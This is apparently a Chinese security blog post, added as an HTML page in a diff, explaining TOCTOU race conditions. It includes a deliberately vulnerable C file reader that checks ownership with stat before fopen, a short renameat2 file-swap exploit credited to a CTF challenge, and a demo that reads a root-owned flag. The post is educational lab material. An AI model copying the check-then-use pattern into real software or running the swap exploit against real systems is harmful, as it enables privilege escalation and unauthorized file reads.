@@ -1,0 +1,389 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    kaia
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="kaia" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Kaia</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        <a class="category-link" href="/categories/binary-security/">binary security</a></li><li><a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/puzzz" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(/gallery/thumbnail/binarysecurity.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >条件竞争漏洞</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="条件竞争漏洞-TOCTOU-Race-Condition"><a href="#条件竞争漏洞-TOCTOU-Race-Condition" class="headerlink" title="条件竞争漏洞(TOCTOU Race Condition)"></a>条件竞争漏洞(TOCTOU Race Condition)</h2><h4 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h4><ul>
+<li>多个线程同时访问同一个代码、变量、文件等没有进行锁操作或同步操作的场景中。</li>
+</ul>
+<h4 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h4><ul>
+<li>绕过数量限制</li>
+<li>文件上传漏洞</li>
+<li>DOS攻击</li>
+<li>权限提升</li>
+</ul>
+<h4 id="3、触发条件"><a href="#3、触发条件" class="headerlink" title="3、触发条件"></a>3、触发条件</h4><ul>
+<li>两个以上的并发执行流</li>
+<li>并发流访问同一对象</li>
+<li>至少有一个控制流会改变竞争对象的状态</li>
+</ul>
+<p><img src="/2021/04/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/image/time_interval.png"></p>
+<p>程序首先执行action1，然后执行action2，正常流程是程序在执行action2时，action1所产生的条件仍然是满足的。<br>但是由于程序的并发性，攻击者很有可能可以在<strong>action2 执行之前的这个短暂的时间差中破坏 action1 所产生的条件</strong>。这时候攻击者的操作与 action2 产生了条件竞争，所以可能会影响程序的执行效果。</p>
+<h4 id="4、案例"><a href="#4、案例" class="headerlink" title="4、案例"></a>4、案例</h4><p><strong>TOCTOU</strong> (Time-of-check Time-of-use) 指的是程序在使用资源（变量，内存，文件）前会对进行检查，但是在程序使用对应的资源前，该资源却被修改了。</p>
+<p><img src="/2021/04/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/image/toctou.png"></p>
+<h3 id="Race-Condition-Enabling-Link-Following"><a href="#Race-Condition-Enabling-Link-Following" class="headerlink" title="Race Condition Enabling Link Following"></a>Race Condition Enabling Link Following</h3><p><em>Linux 中提供了两种对于文件的命名方式</em></p>
+<ul>
+<li><em>文件路径名</em></li>
+<li><em>文件描述符</em></li>
+</ul>
+<p>但是，将这两种命名解析到相应对象上的方式有所不同</p>
+<ul>
+<li><strong>文件路径名</strong>在解析的时候是通过传入的路径（文件名，硬链接，软连接）间接解析的，其传入的参数并不是相应文件的真实地址。  </li>
+<li><strong>文件描述符</strong>通过访问直接指向文件的指针来解析。</li>
+</ul>
+<p>正是由于间接性，产生了上面我们所说的时间差。</p>
+<p>以下面的代码为例子，程序在访问某个文件之前，会检查是否存在，判断文件的权限，之后会打开文件然后执行操作。但是如果在<strong>检查之后，真正使用文件之前</strong>，攻击者使用另一个程序(并发)将文件名替换，那么程序将访问错误的文件，就有可能造成提权，脏牛漏洞差不多也是这个原理。</p>
+<p><em><strong>readfile.c</strong></em></p>
+<pre class="line-numbers language-C"><code class="language-C">#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+
+int main(int argc,char *argv[])&#123;
+    FILE  *fd;
+    char str[20];
+    struct stat stat_data;
+    if (stat(argv[1],&stat_data)<0) &#123;           //获取文件信息
+        printf("获取失败.\n");
+    &#125;
+
+    if (stat_data.st_uid==0) &#123;                  //验证权限
+        printf("无权限\n");
+        exit(1);
+    &#125;
+        fd=fopen(argv[1],"r");                  //操作文件
+        while (fgets(str,20,fd)!=NULL)&#123;
+            printf("%s",str);
+        &#125;
+        fclose(fd);
+    return 0;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里用的是<code>stat</code>函数，通过文件名去获取文件的<code>stat</code>结构，然后再判断文件的所有者，如果所有者不是<code>root</code>的话就打开它，这里从获取文件<code>stat</code>到读取并不是一步就能完成的，这两个操作有一定的时间差。</p>
+<p>现在&#x2F;tmp目录下存在三个文件  </p>
+<ul>
+<li><strong>user.tmp</strong>  空文件</li>
+<li><strong>flag</strong>      软连接</li>
+<li><strong>readfile</strong>  可执行文件</li>
+</ul>
+<pre class="line-numbers language-sh"><code class="language-sh">root@kali:/tmp# ls -li user.tmp flag readfile
+2228722 lrwxrwxrwx 1 user user    19 4月  10 09:47 flag -> /RaceCondition/flag
+2228723 -rwxr-xr-x 1 root root 16976 4月  12 14:54 readfile
+2228721 -rw-r--r-- 1 user user     0 4月  10 09:39 user.tmp
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh"><code class="language-sh">root@kali:/RaceCondition# ls -li flag
+4194310 -rw-r--r-- 1 root root 12 4月   9 11:34 flag
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>假设现在传入的是<code>/tmp/user.tmp</code>文件<code>（st_uid=1001）</code>，它的所有者是 <code>user(uid=1001)</code>，在执行完 <code>stat(argv[1], &amp;stat_data)</code> 之后的那一个瞬间，我用另一个程序(并发)把 <code>/tmp/flag</code> （ <code>/flag</code> 的软链接 <code>st_uid=1001</code>） 重命名为 <code>/tmp/user.tmp</code> 这样的话，在 <code>if</code> 的检测中检查的是原本的那个 <code>user.tmp</code> 文件的 <code>st_uid</code>，而走到 <code>fopen</code> 的时候 <code>argv[1]</code> 虽然也是 <code>/tmp/user.tmp</code> 但是打开的却是原本的 <code>/tmp/flag</code> 文件，而这个文件是 <code>/flag</code> 的软链接，这样我们就能读出 <code>/flag</code> 的内容</p>
+<p>这个需要快速操作，才能通过<code>readfile</code>这个程序读取到 <code>/RaceCondition/flag</code> （因为我们是普通用户不能直接读取 <code>/RaceCondition/flag</code> 文件)</p>
+<p><em><strong>exp</strong></em></p>
+<pre class="line-numbers language-C"><code class="language-C">#define _GNU_SOURCE
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+int main(int argc, char *argv[]) &#123;
+  while (1) &#123;
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  &#125;
+  return 0;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个程序实现交换文件名的功能</p>
+<h4 id="5、演示"><a href="#5、演示" class="headerlink" title="5、演示"></a>5、演示</h4><pre class="line-numbers language-sh"><code class="language-sh">root@kali:/RaceCondition# ./exp /tmp/user.tmp /tmp/flag
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>执行exp后两个文件的名字一直在交换</strong></p>
+<pre class="line-numbers language-sh"><code class="language-sh">root@kali:/tmp# ls -li user.tmp flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -> /RaceCondition/flag
+2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: 无法读取符号链接'user.tmp': 无效的参数
+ls: 无法读取符号链接'flag': 无效的参数
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp
+
+root@kali:/tmp# ls -li user.tmp flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -> /RaceCondition/flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -> /RaceCondition/flag
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: 无法读取符号链接'flag': 无效的参数
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag
+2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: flag: 权限不够
+2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -> /RaceCondition/flag
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: 无法读取符号链接'flag': 无效的参数
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -> /RaceCondition/flag
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: flag: 权限不够
+2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 flag
+2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 user.tmp
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在文件状态一直在改变的瞬间执行<code>readfile</code>程序去读取<code>flag</code></p>
+<pre class="line-numbers language-shell"><code class="language-shell">$ ./readfile /tmp/flag
+无权限
+$ ./readfile /tmp/flag
+无权限
+$ ./readfile /tmp/flag
+无权限
+$ ./readfile /tmp/flag
+$ ./readfile /tmp/flag
+flag&#123;66666&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>第5次执行的时候成功读取root用户文件内容</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following">https://ctf-wiki.org/pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/LiveOverflow/590edaf5cf3adeea31c73e303692dec0">https://gist.github.com/LiveOverflow/590edaf5cf3adeea31c73e303692dec0</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=1hScemFvnzw">https://www.youtube.com/watch?v=1hScemFvnzw</a></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaiasec'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2021/04/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2021/04/12/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//kaiasec.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
